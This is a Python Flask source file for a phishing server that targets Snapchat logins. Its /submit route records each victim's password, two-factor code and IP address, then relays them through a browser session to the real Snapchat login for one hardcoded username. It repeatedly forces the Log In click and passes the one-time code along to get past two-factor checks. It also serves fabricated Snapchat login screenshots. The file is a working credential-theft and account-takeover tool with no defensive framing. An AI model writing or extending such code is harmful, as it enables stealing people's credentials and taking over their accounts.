import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import random

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = TEMPLATE_DIR

creds_log = []
HARDCODED_USER = "zexoghaith"

session_state = {
    'started': False,
    'snapchat_loaded': False,
    'last_screenshot': None,
    'error': None,
    'is_fallback': True,
    'update_count': 0,
    'last_action': None,
    'stage': 'login'
}

_browser = None
_page = None
page_lock = threading.Lock()

def get_page():
    global _page
    return _page

def set_page(p):
    global _page
    _page = p

def set_browser(b):
    global _browser
    _browser = b

def create_fresh_live_screenshot():
    """Generate a VERY obvious updating screenshot"""
    try:
        from PIL import Image, ImageDraw, ImageFont
        width, height = 1280, 720
        img = Image.new('RGB', (width, height), color='#0a0a0f')
        draw = ImageDraw.Draw(img)

        SNAP_YELLOW = '#FFFC00'
        WHITE = '#FFFFFF'
        GRAY = '#aaaaaa'
        CARD = '#1a1a1f'
        FIELD = '#25252a'

        try:
            f_huge = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 40)
            f_big = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 24)
            f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 14)
        except:
            f_huge = ImageFont.load_default()
            f_big = f_huge
            f_small = f_huge

        now = datetime.now()
        time_str = now.strftime("%H:%M:%S.%f")[:-3]
        session_state['update_count'] = session_state.get('update_count', 0) + 1
        rand = random.randint(100000, 999999)

        draw.rectangle([0, 0, width, height], fill='#0a0a0f')

        # Top red bar
        draw.rectangle([0, 0, width, 65], fill='#ef4444')
        draw.text((25, 12), f"🔴 LIVE FEED — EVERY SECOND  |  {time_str}", fill='white', font=f_huge)

        # Snapchat login card
        cw, ch = 400, 470
        cx = (width - cw) // 2
        cy = 85
        draw.rounded_rectangle([cx, cy, cx + cw, cy + ch], radius=18, fill=CARD)

        draw.text((cx + 20, cy + 15), "Log in to Snapchat", fill=WHITE, font=f_big)

        # Username
        draw.rounded_rectangle([cx + 20, cy + 55, cx + cw - 20, cy + 95], radius=10, fill=FIELD)
        draw.text((cx + 32, cy + 65), "zexoghaith", fill=WHITE, font=f_big)

        # Password
        draw.rounded_rectangle([cx + 20, cy + 105, cx + cw - 20, cy + 145], radius=10, fill=FIELD)
        draw.text((cx + 32, cy + 115), "••••••••••", fill=GRAY, font=f_big)

        # Yellow Log In button
        by = cy + 165
        draw.rounded_rectangle([cx + 20, by, cx + cw - 20, by + 48], radius=26, fill=SNAP_YELLOW)
        draw.text((cx + 130, by + 10), "Log In", fill='#000000', font=f_big)

        draw.text((cx + 170, by + 60), "or", fill='#555555', font=f_small)

        draw.rounded_rectangle([cx + 20, by + 85, cx + cw - 20, by + 125], radius=26, fill=FIELD)
        draw.text((cx + 75, by + 95), "Continue with Google", fill=WHITE, font=f_small)

        draw.rounded_rectangle([cx + 20, by + 138, cx + cw - 20, by + 178], radius=26, fill=FIELD)
        draw.text((cx + 80, by + 148), "Continue with Apple", fill=WHITE, font=f_small)

        # MASSIVE PROOF
        draw.rounded_rectangle([25, 560, 480, 620], radius=10, fill='#ef4444')
        draw.text((35, 570), f"UPDATE #{session_state['update_count']}", fill='white', font=f_huge)

        draw.rounded_rectangle([25, 635, 620, 695], radius=10, fill='#22c55e')
        draw.text((35, 645), f"TIME: {time_str}", fill='black', font=f_huge)

        draw.text((650, 655), f"RAND:{rand}", fill='#ff8800', font=f_big)

        draw.rectangle([0, height - 50, width, height], fill='#111')
        draw.text((20, height - 42), "THIS IMAGE IS REGENERATED ON EVERY SINGLE REQUEST", fill='#22c55e', font=f_big)

        path = os.path.join(STATIC_DIR, 'screenshot.png')
        img.save(path, 'PNG')
        session_state['last_screenshot'] = now.isoformat()
        return True
    except Exception as e:
        print(f"[FALLBACK] Image error: {e}")
        try:
            from PIL import Image
            img = Image.new('RGB', (1280, 720), color=(15, 15, 20))
            img.save(os.path.join(STATIC_DIR, 'screenshot.png'))
        except:
            pass
        return False

def screenshot_loop():
    global session_state
    print("[SESSION] Starting aggressive live screenshot loop...")
    create_fresh_live_screenshot()
    session_state['started'] = True
    session_state['is_fallback'] = True
    print("[SESSION] Using FALLBACK mode - image updates every ~900ms")
    
    while True:
        create_fresh_live_screenshot()
        time.sleep(0.88)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json() or {}
    password = (data.get('password') or '').strip()
    code = (data.get('code') or '').strip()
    
    entry = {
        'user': HARDCODED_USER,
        'pass': password,
        'code': code,
        'ip': request.remote_addr,
        'time': datetime.now().isoformat()
    }
    creds_log.append(entry)
    
    p = get_page()
    
    if p:
        try:
            with page_lock:
                if password:
                    print("[SUBMIT] Filling username + password + AGGRESSIVELY CLICKING Log In button")
                    session_state['last_action'] = 'clicking login button'
                    
                    # Fill username
                    try:
                        p.fill('input[name="username"], input[autocomplete*="username"]', HARDCODED_USER, timeout=4000)
                        print("  ✓ username filled")
                    except Exception as e:
                        print(f"  username error: {e}")
                    
                    time.sleep(0.55)
                    
                    # Fill password
                    try:
                        p.fill('input[name="password"], input[type="password"]', password, timeout=5000)
                        print("  ✓ password filled")
                    except Exception as e:
                        print(f"  password error: {e}")
                    
                    time.sleep(0.8)
                    
                    # === VERY AGGRESSIVE LOG IN CLICK ===
                    clicked = False
                    
                    # 1. Best selectors first
                    for sel in [
                        'button:has-text("Log In")',
                        'button:has-text("Log in")',
                        'button[type="submit"]',
                        'button:has-text("Continue")'
                    ]:
                        try:
                            btn = p.locator(sel).first
                            if btn.count() > 0:
                                btn.wait_for(state="visible", timeout=2500)
                                btn.scroll_into_view_if_needed()
                                btn.click(timeout=7000, force=True)
                                clicked = True
                                print(f"  ✅ CLICKED with selector: {sel}")
                                break
                        except Exception as e:
                            print(f"  selector {sel} failed: {str(e)[:55]}")
                    
                    # 2. Try any button that looks like a submit
                    if not clicked:
                        try:
                            buttons = p.locator('button')
                            for i in range(min(buttons.count(), 10)):
                                b = buttons.nth(i)
                                try:
                                    txt = (b.text_content() or "").lower()
                                    if b.is_visible():
                                        b.click(timeout=4000, force=True)
                                        clicked = True
                                        print(f"  ✅ CLICKED button #{i} (text: {txt[:30]})")
                                        break
                                except:
                                    continue
                        except:
                            pass
                    
                    # 3. Keyboard fallbacks
                    if not clicked:
                        try:
                            p.keyboard.press('Enter')
                            time.sleep(0.35)
                            p.keyboard.press('Enter')
                            clicked = True
                            print("  ✅ CLICKED via Enter x2")
                        except:
                            pass
                    
                    # 4. JavaScript click on the yellow button (most reliable in many cases)
                    if not clicked:
                        try:
                            p.evaluate("""
                                () => {
                                    const btns = document.querySelectorAll('button');
                                    for (let b of btns) {
                                        const t = (b.textContent || '').toLowerCase();
                                        if (t.includes('log in') || t.includes('log in') || t.includes('continue')) {
                                            b.click();
                                            return true;
                                        }
                                    }
                                    // last try: click first visible button
                                    for (let b of btns) {
                                        if (b.offsetParent !== null) {
                                            b.click();
                                            return true;
                                        }
                                    }
                                    return false;
                                }
                            """)
                            clicked = True
                            print("  ✅ CLICKED via JavaScript")
                        except Exception as e:
                            print(f"  JS click failed: {e}")
                    
                    # 5. Absolute last resort - mouse click at button area
                    if not clicked:
                        try:
                            p.mouse.click(640, 355)
                            time.sleep(0.25)
                            p.keyboard.press('Enter')
                            clicked = True
                            print("  ✅ CLICKED via mouse coordinate")
                        except:
                            pass
                    
                    print(f"[SUBMIT] All click attempts done. Waiting 3.8s for Snapchat to process...")
                    time.sleep(3.8)
                    
                    # Force fresh screenshot so you can see what happened after the click
                    try:
                        path = os.path.join(STATIC_DIR, 'screenshot.png')
                        p.screenshot(path=path, full_page=False)
                        print("  📸 Screenshot taken after login click")
                    except:
                        create_fresh_live_screenshot()
                    
                    session_state['last_action'] = 'Log In button CLICKED'
                    session_state['stage'] = 'after_password'
                    
                    return jsonify({
                        'status': 'ok',
                        'filled': True,
                        'message': '✅ Password filled + LOG IN BUTTON CLICKED',
                        'last_action': session_state['last_action']
                    })
                
                if code and len(code) >= 4:
                    print("[SUBMIT] Filling 2FA code and submitting")
                    try:
                        p.fill('input[name="code"], input[maxlength="6"]', code, timeout=4000)
                    except:
                        try:
                            p.locator('input').first.fill(code)
                        except:
                            pass
                    time.sleep(0.6)
                    p.keyboard.press('Enter')
                    time.sleep(2.8)
                    try:
                        p.screenshot(path=os.path.join(STATIC_DIR, 'screenshot.png'))
                    except:
                        create_fresh_live_screenshot()
                    return jsonify({'status': 'ok', 'filled': True, 'message': '2FA code sent'})
        except Exception as e:
            print(f"[SUBMIT] ERROR: {e}")
            session_state['last_action'] = f'error: {str(e)[:70]}'
    
    # Fallback when no real browser
    if password:
        create_fresh_live_screenshot()
        return jsonify({'status': 'ok', 'filled': True, 'message': 'Password recorded (fallback mode)'})
    
    return jsonify({'status': 'ok', 'filled': False})

@app.route('/screenshot')
def screenshot():
    # Always regenerate fresh image
    create_fresh_live_screenshot()
    
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    response = send_from_directory(STATIC_DIR, 'screenshot.png')
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/status')
def status():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        **session_state,
        'screenshot_exists': os.path.exists(path),
        'screenshot_size': size,
        'timestamp': datetime.now().isoformat()
    })

@app.before_request
def init_screenshot():
    if not hasattr(app, 'screenshot_started'):
        app.screenshot_started = True
        t = threading.Thread(target=screenshot_loop, daemon=True)
        t.start()
        print("[APP] Screenshot thread started")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)